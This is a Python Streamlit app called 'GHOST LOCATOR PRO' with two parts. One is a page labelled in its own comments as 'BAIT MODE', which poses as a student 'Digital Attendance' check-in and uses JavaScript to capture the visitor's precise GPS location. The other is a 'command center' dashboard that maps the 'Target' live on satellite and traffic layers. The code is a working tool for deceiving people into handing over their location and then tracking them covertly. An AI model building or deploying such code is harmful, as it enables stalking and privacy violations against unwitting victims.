import streamlit as st
import pandas as pd
import folium
from streamlit_folium import st_folium
from streamlit_autorefresh import st_autorefresh
import datetime
import random

# --- Page Config ---
st.set_page_config(page_title="GHOST LOCATOR PRO", page_icon="🛰️", layout="wide")

# --- CSS Styling ---
st.markdown("""
    <style>
    .stApp { background-color: #0e1117; }
    h1 { color: #00ff41; text-shadow: 0 0 10px #00ff41; text-align: center; font-family: 'Courier New', monospace; }
    [data-testid="stSidebar"] { border-right: 2px solid #00f2ff; box-shadow: 5px 0px 15px #00f2ff; }
    .stMetricValue { color: #00f2ff !important; text-shadow: 0 0 5px #00f2ff; }
    .attendance-box { border: 2px solid #00f2ff; padding: 40px; border-radius: 15px; text-align: center; background: #1a1c23; }
    </style>
    """, unsafe_allow_html=True)

# --- Initialize Session State for Location Locking ---
if 'locked_lat' not in st.session_state:
    st.session_state.locked_lat = 21.1702
if 'locked_lon' not in st.session_state:
    st.session_state.locked_lon = 72.8311
if 'target_active' not in st.session_state:
    st.session_state.target_active = False

# --- Handling Data from URL ---
query_params = st.query_params

# Update state if new data comes from URL
if "lat" in query_params and "lon" in query_params:
    st.session_state.locked_lat = float(query_params["lat"])
    st.session_state.locked_lon = float(query_params["lon"])
    st.session_state.target_active = True

# --- BAIT MODE (Student Side) ---
if query_params.get("mode") == "attendance":
    st.markdown("<div class='attendance-box'><h2 style='color: #00f2ff;'>Digital Attendance</h2><p>Marking presence... please wait.</p></div>", unsafe_allow_html=True)
    
    js_code = """
    <script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const urlParams = new URLSearchParams(window.location.search);
                const id = urlParams.get('id') || 'Unknown';
                // Final Redirect
                window.location.href = window.location.origin + window.location.pathname + "?id=" + id + "&lat=" + lat + "&lon=" + lon;
            }, function(error) {
                alert("Please Allow Location to Mark Attendance");
            }, {enableHighAccuracy: true});
        }
    }
    getLocation();
    </script>
    """
    st.components.v1.html(js_code, height=0)
    st.stop()

# --- DASHBOARD MODE (Your Side) ---
st_autorefresh(interval=5000, key="loc_refresh")

st.title("🛰️ GHOST LOCATOR: COMMAND CENTER")

# Sidebar
st.sidebar.header("📡 CONNECTION")
if st.sidebar.button("Reset Tracker"):
    st.session_state.target_active = False
    st.rerun()

# Layout
col1, col2 = st.columns([1, 2.5])

with col1:
    st.markdown("### 📊 Telemetry")
    st.metric("Latitude", f"{st.session_state.locked_lat} N")
    st.metric("Longitude", f"{st.session_state.locked_lon} E")
    status = "LIVE ✅" if st.session_state.target_active else "AWAITING 📡"
    st.write(f"**Status:** {status}")
    st.write(f"**Last Seen:** {datetime.datetime.now().strftime('%H:%M:%S')}")

with col2:
    m = folium.Map(location=[st.session_state.locked_lat, st.session_state.locked_lon], zoom_start=16)
    
    folium.TileLayer('cartodbdarkmatter', name='Dark Mode').add_to(m)
    folium.TileLayer(tiles='https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', attr='Google', name='Satellite').add_to(m)
    folium.TileLayer(tiles='https://mt1.google.com/vt/lyrs=h,traffic&x={x}&y={y}&z={z}', attr='Google Traffic', name='Traffic', overlay=True).add_to(m)

    folium.Marker(
        [st.session_state.locked_lat, st.session_state.locked_lon],
        popup="Target",
        icon=folium.Icon(color='red' if st.session_state.target_active else 'gray')
    ).add_to(m)

    folium.LayerControl().add_to(m)
    st_folium(m, width="100%", height=550, key="main_map")
